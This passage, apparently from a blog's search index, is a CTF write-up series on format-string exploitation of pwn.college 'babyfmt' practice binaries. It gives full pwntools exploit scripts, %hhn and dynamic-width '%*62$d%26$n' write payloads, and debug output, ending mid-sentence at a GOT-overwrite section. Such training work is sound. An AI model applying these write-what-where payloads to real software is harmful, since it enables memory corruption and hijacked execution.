preps.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#find_offset_and_padlenpy","title":"find_offset_and_padlen.py","text":"<pre><code>from pwn import *\n\n# Load binary and configure context\nelf = context.binary = ELF('./babyfmt_level4.0', checksec=False)\ncontext.log_level = 'debug'\n\ngdbscript = '''\ncontinue\n'''\n\ndef start():\n    if args.GDB:\n        return gdb.debug([elf.path], gdbscript=gdbscript)\n    return process([elf.path])\n\n#### send helper ####\ndef send_fmt(payload):\n    io = start()\n    try:\n        io.sendafter(b'Send your data!\\n', payload)\n        data = io.recvall(timeout=0.01)\n        return data\n    finally:\n        io.close()\n\nf = FmtStr(send_fmt)\n\nsuccess(f'User input starts at  : {f.offset}')\nsuccess(f'Needed pads           :{f.padlen}')\nsuccess(f'Numbwritten           :{f.numbwritten}')\n</code></pre> <p>The result:</p> <pre><code>[DEBUG] Received 0xf4 bytes:\n    b'Received 33 bytes!\\n'\n    b'\\n'\n    b'I will now call printf on your data!\\n'\n    b'\\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6361616162616161END\\n'\n    b\"And now, let's check the win value!\\n\"\n    b'Checking win value...\\n'\n    b'... desired win value: 0xa5\\n'\n    b'... written win value: 0\\n'\n    b'... INCORRECT!\\n'\n    b'### Goodbye!\\n'\n[*] Found format string offset: 27\n[+] User input starts at  : 27\n[+] Needed pads           :1\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#get-win_value-and-win_address-with-regex-practice","title":"get win_value and win_address with regex practice.","text":"<pre><code>In [11]: import re\n    ...: \n    ...: text = \"\"\"\n    ...: ### Welcome to ./babyfmt_level4.0! ###\n    ...: This challenge requires you to set a win value, located in the .bss, to 0xa5.\n    ...: The win value in the .bss is located at 0x404170! Remember to write this in little endian.\n    ...: \"\"\"\n    ...: \n    ...: match = re.findall(r\"0x[0-9a-fA-F]+\", text)\n    ...: if match:\n    ...:     print(match)\n    ...: \n['0xa5', '0x404170']\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#get_flagpy-1st","title":"get_flag.py 1st:","text":"<pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF(args.EXE or './babyfmt_level4.0')\ncontext.log_level = 'debug'\n#context.log_level = 'info'\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+445\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\nio = start()\n\n#### get win_value and win_address ####\nleaks = get_win_address_and_value(io.recvuntil(b'offset.'))\ndesired_val = int(leaks[0], 16)\nwin_addr    = int(leaks[1], 16)\n\ninfo(f'Desired Value: {desired_val:#x}')\ninfo(f'Win Address  : {win_addr:#x}')\n\nio.interactive()\n</code></pre> <p>The result:</p> <pre><code>[DEBUG] Received 0x11e bytes:\n    b'\\n'\n    b'The win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.\\n'\n    b'Remember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.\\n'\n    b'\\n'\n    b'I will now read up to 256 bytes. Send your data!\\n'\n[*] Desired Value: 0xa5\n[*] Win Address  : 0x404170\n[*] Switching to interactive mode\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#get_flagpy-2nd","title":"get_flag.py 2nd:","text":"<p>The below variant of get_flag.py script, writing win_value at the specified address(win_address).</p> <p>The fmt variable looks like this: <code>%165c%29$hhn</code></p> <p>What does this do ?</p> <p><code>%165c%29$hhn</code> is a classic format-string write gadget:</p> <p><code>%165c</code> \u2192 prints a single character with a minimum field width of 165.     That means <code>printf</code> outputs 165 bytes total (164 spaces of padding + 1 character).     Net effect: the internal \u201ccharacters printed so far\u201d counter becomes 165 (<code>0xA5</code>).</p> <ul> <li> <p><code>%29$hhn</code> \u2192 <code>%n</code>-family write using:</p> </li> <li> <p><code>hhn</code> \u2192 write only 1 byte (low 8 bits) of the count to memory.</p> </li> <li> <p><code>29$</code> \u2192 use the 29-th argument as the pointer destination.         (In payload, arranged that the 29th argument is <code>win_address</code>.)</p> </li> </ul> <p>Putting it together:</p> <ol> <li> <p>first place <code>win_address</code> somewhere in the argument list (so it sits at position 29 on the stack for <code>printf</code>).</p> </li> <li> <p><code>%165c</code> bumps the printed-chars count to 165.</p> </li> <li> <p><code>%29$hhn</code> writes <code>165 mod 256 = 0xA5</code> into the byte at <code>win_address</code>.</p> </li> </ol> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF(args.EXE or './babyfmt_level4.0')\ncontext.log_level = 'debug'\n#context.log_level = 'info'\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+445\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\ndef build_payload(fmt: bytes, addrs: list[int], padlen: int, filler: bytes = b\"|\") -&gt; bytes:\n    ptrsz = context.bytes\n    layout = { padlen: fmt }\n    for i, a in enumerate(addrs):\n        off = padlen + 16 + i*ptrsz\n        layout[off] = p64(a) if ptrsz == 8 else p32(a)\n    return fit(layout, filler=filler)\n\n\n\nio = start()\n\n#### get win addr ####\nleaks = get_win_address_and_value(io.recvuntil(b'offset.'))\ndesired_val = int(leaks[0], 16)\nwin_addr    = int(leaks[1], 16)\n\ninfo(f'Desired Value: {desired_val:#x}')\ninfo(f'Win Address  : {win_addr:#x}')\n\n#### set win value(0x5a) at win_addr ####\noffset = 27\npadlen = 1\n\nfmt = flat(f'%{desired_val}c%{offset+16//context.bytes}$hhn')\npayload = build_payload(fmt, [win_addr], padlen=padlen)\n\nio.sendafter(b'data!\\n', payload)\n\nio.interactive()\n</code></pre> <p>The failure result:</p> <pre><code>I will now call printf on your data!\n\n|                                                                                                                                                                    C||||pA@\nAnd now, let's check the win value!\nChecking win value...\n... desired win value: 0xa5\n... written win value: 0xa6\n... INCORRECT!\n### Goodbye!\n[*] Got EOF while reading in interactive\n</code></pre> <p>Why 0xa6 not 0xa5. This happened because when we aligned the stack for correct spot to win_address. We settled padlen value as 1. The extra 1 comes from there.</p> <p>if we correct the calculation like this. Problem will solve.</p> <pre><code>fmt = flat(f'%{desired_val-padlen}c%{offset+16//context.bytes}$hhn')\n</code></pre> <p>The payload became : <code>%164c%29$hhn</code></p> <p>The result:</p> <pre><code>And now, let's check the win value!\nChecking win value...\n... desired win value: 0xa5\n... written win value: 0xa5\n... SUCCESS! Here is your flag:\npwn.college{sp4****************************EzW}\n### Goodbye!\n</code></pre> <p>Once a wise man i work with, said to me this:</p> <p>*You can\u2019t automate the process before understanding how to do it manually. * - Evren Pazo\u011flu</p> <p>So hope helps you to understand the process. Now make it simple with pwntools 2 different way.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#get_flag_fmtstr_payloadpy","title":"get_flag_fmtstr_payload.py","text":"<p>This one using pwntools's fmtstr_payload method to create write-what-where payload. Basically its replicating from fmtstr.py|Line 1027 .</p> <p>Some notes:</p> <p>numbwritten set as padlen, as you know the alignment in the stack we need to pad 1.</p> <p>adding random string before payload, the length must equal to padlen. Simply adding 1 random string. For more information: randoms</p> <p>You can extend as many as you want with this approach. Manual approach needs more work to do that. This is really make life easier. <pre><code>exe = context.binary = ELF(args.EXE or './babyfmt_level4.0')\ncontext.log_level = 'debug'\n#context.log_level = 'info'\n\n\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+445\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\nio = start()\n\n#### get win addr ####\nleaks = get_win_address_and_value(io.recvuntil(b'offset.'))\ndesired_val = int(leaks[0], 16)\nwin_addr    = int(leaks[1], 16)\n\ninfo(f'Desired Value: {desired_val:#x}')\ninfo(f'Win Address  : {win_addr:#x}')\n\n#### set win value(0x5a) at win_addr ####\noffset = 27\npadlen = 1\n\nwrites = {win_addr: desired_val}\npayload = fmtstr_payload(offset=27, writes=writes, numbwritten=padlen, write_size='byte')\npayload = randoms(padlen).encode()+payload\ninfo(f'Final payload: {payload}')\n\nio.sendafter(b'data!\\n', payload)\n\nio.interactive()\n</code></pre></p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#get_flag_fmtstrpy","title":"get_flag_FmtStr.py","text":"<p>This one make more easier than previous 2 approach. Settling needed offset, padlen and helper method values. and than just fired up. Rest is handled by pwntools &lt;3.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF(args.EXE or './babyfmt_level4.0')\n#context.log_level = 'debug'\ncontext.log_level = 'info'\n\n\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+445\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\n#### send helper ####\ndef send_fmt(payload):\n    io.sendafter(b'data!\\n', payload)\n\nio = start()\n\n#### get win addr ####\nleaks = get_win_address_and_value(io.recvuntil(b'offset.'))\ndesired_val = int(leaks[0], 16)\nwin_addr    = int(leaks[1], 16)\n\ninfo(f'Desired Value: {desired_val:#x}')\ninfo(f'Win Address  : {win_addr:#x}')\n\n### set desired value(0x5a) at win_addr ####\noffset = 27\npadlen = 1\n\nf = FmtStr(send_fmt, offset=offset, padlen=padlen)\nf.write(win_addr, desired_val)\nf.execute_writes()\n\ntry:\n    io.recvuntil(b'Here is your flag:\\n')\n    flag = io.recvline().strip()\n    io.critical(f'FLAG: {flag}')\nexcept:\n    io.error(\"Couldn't hack it!\")\nfinally:\n    io.close()\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/05-Format-String-Attack-Write-what-where-1-byte/#references","title":"References","text":"<ul> <li> <p>glibc Manual \u2013 Formatted Output https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html</p> </li> <li> <p>man 3 printf (POSIX printf specifiers, including <code>%n</code>) https://man7.org/linux/man-pages/man3/printf.3.html</p> </li> <li> <p>Pwntools Documentation \u2013 Format String Exploits https://docs.pwntools.com/en/stable/fmtstr.html</p> </li> <li> <p>Pwntools Source \u2013 <code>fmtstr_payload</code> Implementation https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027</p> </li> <li> <p>Pwntools Utility \u2013 <code>randoms()</code> https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/util/fiddling.py#L458</p> </li> <li> <p>Exploit Education \u2013 Format String Vulnerabilities https://exploit.education/phoenix/format-string/</p> </li> <li> <p>OWASP Testing Guide \u2013 Format String Attack https://owasp.org/www-community/attacks/Format_string_attack</p> </li> <li> <p>LiveOverflow CTF Video (Format String Basics) https://www.youtube.com/watch?v=0WvrSfcdq1I</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/","title":"Write-What-Where - 8 bytes","text":"","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/#format-string-attack-write-what-where-8-bytes","title":"Format String Attack - Write-What-Where - 8 bytes","text":"<p>This variant includes 8 bytes write-what-where</p> <p>Steps same as before. nothing to mentioned specially here.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/#babyfmt_level50","title":"babyfmt_level5.0","text":"<pre><code>root@56972fd7d79f:/host# checksec babyfmt_level5.0 \n[*] '/host/babyfmt_level5.0'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre> <p>When run the binary without doing anything special.</p> <pre><code>root@56972fd7d79f:/host# ./babyfmt_level5.0 \n###\n### Welcome to ./babyfmt_level5.0!\n###\n\nThis challenge reads in some bytes, calls printf on that string, and allows you to perform\na format string attack. Through this series of challenges, you will become painfully familiar\nwith the concept of Format String Attacks!\n\nThis challenge allows you to make a 256-sized format string.\n\nThis challenge requires you to set a win value, located in the .bss, to 0x82802f819c27a46a. If you successfully\npull that off, the challenge will give you the flag! You will need to use %n to set this value\nMoreover, since the win value is so large, you will need to use several %hn writes rather than an %ln.\n\nThe win value in the .bss is located at 0x4040f8! Remember to write this in little endian in your format string.\nRemember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.\n\nI will now read up to 256 bytes. Send your data!\nasd\nReceived 4 bytes!\n\nI will now call printf on your data!\n\nasd\n\nAnd now, let's check the win value!\nChecking win value...\n... desired win value: 0x82802f819c27a46a\n... written win value: 0\n... INCORRECT!\n### Goodbye!\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/#the-offset-and-padlen-values","title":"The offset and padlen values","text":"<p>Previous script will constantly using the get these values. </p> <pre><code>[DEBUG] Received 0x102 bytes:\n    b'Received 33 bytes!\\n'\n    b'\\n'\n    b'I will now call printf on your data!\\n'\n    b'\\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161616261616161END\\n'\n    b\"And now, let's check the win value!\\n\"\n    b'Checking win value...\\n'\n    b'... desired win value: 0x82802f819c27a46a\\n'\n    b'... written win value: 0\\n'\n    b'... INCORRECT!\\n'\n    b'### Goodbye!\\n'\n[*] Found format string offset: 38\n[+] User input starts at  : 38\n[+] Needed pads           :0\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/#get_flagpy","title":"get_flag.py","text":"<p>Nothing fancy here. FmtStr class make life really easier. Excellent library pwntools &lt;3.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF(args.EXE or './babyfmt_level5.0')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+467\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\ndef send_fmt(payload):\n    io.sendafter(b'Send your data!\\n', payload)\n\n\nio = start()\n\n#### get win_value and win_address ####\nleaks = get_win_address_and_value(io.recvuntil(b'offset.'))\ndesired_val = int(leaks[0], 16)\nwin_addr    = int(leaks[1], 16)\n\ninfo(f'Desired Value: {desired_val:#x}')\ninfo(f'Win Address  : {win_addr:#x}')\n\n#### write win_value at win_address ####\noffset = 38\npadlen = 0\n\nf = FmtStr(send_fmt, offset=38, padlen=0, numbwritten=padlen)\nf.write(win_addr, desired_val)\nf.execute_writes()\n\n\nsuccess(io.recv())\n\nio.interactive()\n</code></pre> <p>The result:</p> <pre><code>And now, let's check the win value!\nChecking win value...\n... desired win value: 0x82802f819c27a46a\n... written win value: 0x82802f819c27a46a\n... SUCCESS! Here is your flag:\npwn.college{skd**************************EzW}\n### Goodbye!\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/06-Format-String-Attack-Write-what-where-8-bytes/#references","title":"References","text":"<ul> <li> <p>glibc Manual \u2013 Formatted Output https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html</p> </li> <li> <p>man 3 printf (POSIX specifiers, positional args, <code>%n</code>) https://man7.org/linux/man-pages/man3/printf.3.html</p> </li> <li> <p>CERT C \u2013 FIO30-C: Exclude user input from format strings https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings</p> </li> <li> <p>MITRE CWE-134 \u2013 Externally-Controlled Format String https://cwe.mitre.org/data/definitions/134.html</p> </li> <li> <p>Pwntools Documentation \u2013 Format String Exploits https://docs.pwntools.com/en/stable/fmtstr.html</p> </li> <li> <p>Pwntools Source \u2013 <code>fmtstr_payload</code> Implementation https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027</p> </li> <li> <p>Exploit Education \u2013 Format String Vulnerabilities https://exploit.education/phoenix/format-string/</p> </li> <li> <p>CTF 101 \u2013 Format String Vulnerability https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</p> </li> <li> <p>pwn.college \u2013 Format String Exploits https://pwn.college/software-exploitation/format-string-exploits</p> </li> <li> <p>Classic Paper \u2013 Exploiting Format String Vulnerabilities (scut/Team TESO) https://cs155.stanford.edu/papers/formatstring-1.2.pdf</p> </li> <li> <p>OWASP \u2013 Format String Attack https://owasp.org/www-community/attacks/Format_string_attack</p> </li> <li> <p>LiveOverflow CTF Video \u2013 Format String Basics https://www.youtube.com/watch?v=0WvrSfcdq1I</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/","title":"Write-What-Where - `printf` Dynamic Padding Size (`*`)","text":"","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#format-string-attack-write-what-where-printf-dynamic-padding-size","title":"Format String Attack - Write-What-Where - <code>printf</code> Dynamic Padding Size (<code>*</code>)","text":"<p>Normally, when you use format specifiers like <code>%10d</code> or <code>%-20s</code>, the number before the conversion character (<code>d</code>, <code>s</code>, <code>x</code>, etc.) sets the field width (padding).</p> <p>But C also lets you provide that width dynamically at runtime, using an asterisk <code>*</code></p> <ul> <li> <p><code>*</code> means: \u201cTake the next argument (an <code>int</code>) from the variadic argument list and use it as the width or precision.\u201d</p> </li> <li> <p>You can use <code>*</code> for width, precision, or both.</p> </li> </ul> <p>The <code>*</code> tells <code>printf</code> to take the width from an argument instead of being written in the format string.</p> <pre><code>printf(\"%*d\\n\", 5, 42);\n</code></pre> <p>Output: <code>42</code> -&gt; aligned right 5.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#the-special-n-specifier","title":"The special <code>%n</code> specifier","text":"<ul> <li> <p><code>%n</code> doesn\u2019t print anything.</p> </li> <li> <p>Instead, it writes the number of characters printed so far into an integer pointer you pass.</p> </li> </ul> <p>Example: <pre><code>int count;\nprintf(\"Hello, world!%n\", &amp;count);\nprintf(\" -&gt; printed %d characters\\n\", count);\n</code></pre></p> <p>Output: <pre><code>Hello, world! -&gt; printed 13 characters\n</code></pre></p> <p>printf(3) man page</p> <p>Decimal digit string (with nonzero first digit)        specifying a minimum field width.  If the converted value has        fewer characters than the field width, it will be padded with        spaces on the left (or right, if the left-adjustment flag has been        given).  Instead of a decimal digit string one may write \"\" or        \"m$\" (for some decimal integer m) to specify that the field width        is given in the next argument, or in the m-th argument,        respectively, which must be of type int.  A negative field width        is taken as a '-' flag followed by a positive field width.  In no        case does a nonexistent or small field width cause truncation of a        field; if the result of a conversion is wider than the field        width, the field is expanded to contain the conversion result.</p> <p>Precision        An optional precision, in the form of a period ('.')  followed by        an optional decimal digit string.  Instead of a decimal digit        string one may write \"\" or \"m$\" (for some decimal integer m) to        specify that the precision is given in the next argument, or in        the m-th argument, respectively, which must be of type int.  If        the precision is given as just '.', the precision is taken to be        zero.  A negative precision is taken as if the precision were        omitted.  This gives the minimum number of digits to appear for d,        i, o, u, x, and X conversions, the number of digits to appear        after the radix character for a, A, e, E, f, and F conversions,        the maximum number of significant digits for g and G conversions,        or the maximum number of characters to be printed from a string        for s and S conversions.</p> <p>The relevant part is <code>%*m$</code> here. Simply this means, attacker can place index number.  Here is simple example will use in PoC later.</p> <p>What does this do : <code>%*62$d%26$n</code></p> <p>getting the number stored in 62th index. write that value inside of 26th index.</p> <p>Reproduce the attack.</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#babyfmt_level60","title":"babyfmt_level6.0","text":"<pre><code>root@92ef0ade0e38:/host# ./babyfmt_level6.0 \n###\n### Welcome to ./babyfmt_level6.0!\n###\n\nThis challenge reads in some bytes, calls printf on that string, and allows you to perform\na format string attack. Through this series of challenges, you will become painfully familiar\nwith the concept of Format String Attacks!\n\nThis challenge allows you to make a 256-sized format string.\n\nThis challenge requires you to set a win value, located in the .bss, to a secret value! This secret value\nis currently stored in a stack variable, and you will have to figure out how to copy it into the .bss.\nThere are two options: do a leak (using one printf) followed by a write (using a second printf), or use\na _dynamic padding size_, using the * format character, in combination with %n, in a _single_ printf,\nto copy memory. Since this level only gives you a single printf() call, you will likely need to use the\nlatter. Check the printf man page (in category 3: `man 3 printf`) for documentation on *.\n\nAs before, if you successfully pull that off, the challenge will give you the flag!\n\nThe win value in the .bss is located at 0x404170! Remember to write this in little endian in your format string.\nRemember, you can swap %n with %lx to see what address you will be writing into to make sure you have the.correct offset.\n\nThe secret value is located on the stack, 0x130 bytes after the start of your format string!\n\nI will now read up to 256 bytes. Send your data!\nasd\nReceived 4 bytes!\n\nI will now call printf on your data!\n\nasd\n\nAnd now, let's check the win value!\nChecking win value...\n... desired win value: 0x1bd0de\n... written win value: 0\n... INCORRECT!\n### Goodbye!\n</code></pre> <p>The explanation is telling everything needed.  The secret value user_input+0x130 . That means offset+(0x130/8) is the offset of win value.  Giving hint special formatter of printf <code>*</code></p> <p>Note: The desired value dynamically changed. So lame way doesn't work. (lol)</p>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#find-offset-and-padlen-values","title":"find offset and padlen values","text":"<p>User input starts at offset: 24. Win values offset: 24+(0x130/8) = 62.</p> <pre><code>[DEBUG] Received 0xf8 bytes:\n    b'Received 33 bytes!\\n'\n    b'\\n'\n    b'I will now call printf on your data!\\n'\n    b'\\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161616261616161END\\n'\n    b\"And now, let's check the win value!\\n\"\n    b'Checking win value...\\n'\n    b'... desired win value: 0x2bd41c\\n'\n    b'... written win value: 0\\n'\n    b'... INCORRECT!\\n'\n    b'### Goodbye!\\n'\n[*] Found format string offset: 24\n[+] User input starts at  : 24\n[+] Needed pads           :0\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#get_flagpy","title":"get_flag.py","text":"<p>Added explanation inside of PoC. Happy reading...</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF(args.EXE or './babyfmt_level6.0')\ncontext.terminal=['tmux', 'splitw', '-v']\ncontext.log_level = 'debug'\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ngdbscript = '''\nb *func+571\ncontinue\n'''.format(**locals())\n\n# -- Exploit goes here --\n\ndef get_win_address_and_value(text):\n    match = re.findall(rb\"0x[0-9a-fA-F]+\", text)\n    if match:\n        return match\n    return None\n\nio = start()\n\n\n#### leak target address ####\n\nleaks       = get_win_address_and_value(io.recvuntil(b'offset.'))\ntarget_addr = int(leaks[0], 16)\n\ninfo(f'Target Addr: {target_addr:#x}')\n\n\n#### write target address ####\noffset = 24\npadlen = 0\n\nprintf_dyn_pad_size = '%*62$d'\nfmt = '%26$n'\n\npayload = flat(printf_dyn_pad_size+fmt+randoms((len(printf_dyn_pad_size)+len(fmt))-len(printf_dyn_pad_size)),\n               target_addr)\n\n\nio.sendafter(b'data!\\n', payload)\n\n#info(io.recv())\ninfo(f'''User input starts at {offset}th offset,\n     but {printf_dyn_pad_size} added extra {len(printf_dyn_pad_size)} bytes.\n     Also {fmt} is another {len(fmt)} bytes.\n     Total added bytes: {len(printf_dyn_pad_size) + len(fmt)}.\n     Plus stack alignment push offset to {offset + 2}.''')\ninfo(f'The offset of the win value start of format string+0x130, so win value offset: {offset+int((0x130)/8)}')\ninfo(f'Builded Payload: {repr(payload)}')\nio.interactive()\n</code></pre> <p>The result:</p> <pre><code>And now, let's check the win value!\nChecking win value...\n... desired win value: 0x709953\n... written win value: 0x709953\n... SUCCESS! Here is your flag:\npwn.college{sKTvWi************************************MzEzW}\n### Goodbye!\n</code></pre>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/07-Format-String-Attack-printf-Dynamic-padding-size/#references","title":"References","text":"<ul> <li> <p>glibc Manual \u2013 Formatted Output https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html</p> </li> <li> <p>man 3 printf (POSIX printf specifiers, including <code>*m$</code> and <code>%n</code>) https://man7.org/linux/man-pages/man3/printf.3.html</p> </li> <li> <p>The Open Group Base Specifications \u2013 fprintf() (rules for positional arguments) https://pubs.opengroup.org/onlinepubs/9699919799/functions/fprintf.html</p> </li> <li> <p>CERT C \u2013 FIO30-C: Exclude user input from format strings https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.%2BExclude%2Buser%2Binput%2Bfrom%2Bformat%2Bstrings</p> </li> <li> <p>MITRE CWE-134 \u2013 Externally-Controlled Format String https://cwe.mitre.org/data/definitions/134.html</p> </li> <li> <p>Pwntools Documentation \u2013 Format String Exploits https://docs.pwntools.com/en/stable/fmtstr.html</p> </li> <li> <p>Pwntools Source \u2013 <code>fmtstr_payload</code> Implementation https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L1027</p> </li> <li> <p>Exploit Education \u2013 Format String Vulnerabilities https://exploit.education/phoenix/format-string/</p> </li> <li> <p>CTF 101 \u2013 Format String Vulnerability https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</p> </li> <li> <p>pwn.college \u2013 Format String Exploits https://pwn.college/software-exploitation/format-string-exploits</p> </li> <li> <p>Classic Paper \u2013 Exploiting Format String Vulnerabilities (scut/Team TESO) https://cs155.stanford.edu/papers/formatstring-1.2.pdf</p> </li> <li> <p>OWASP \u2013 Format String Attack https://owasp.org/www-community/attacks/Format_string_attack</p> </li> <li> <p>LiveOverflow CTF Video \u2013 Format String Basics https://www.youtube.com/watch?v=0WvrSfcdq1I</p> </li> </ul>","tags":["binary-exploitation","format-string-attack","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/","title":"Format String Attack - Redirect Code Execution (GOT Overwrite)","text":"<p>The difference in this post than previous posts, the target always given by challenge. This time the target is not obviously given by challenge.</p> <p>Also previous posts, avoided debugging as possible as can. So what that meant by Redirect Code Execution, below you can find out.</p> <p>Digging the challenge binary.</p>","tags":["pwn","binary-exploitation","format-string","got-overwrite","ctf"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/#babyfmt_level70","title":"babyfmt_level7.0","text":"<p>So the challenge explains pretty well the situation. The target is not obvious but one thing really helpful. </p> <p>Challenge keeps letting infinite input chance for playing with the memory with format string 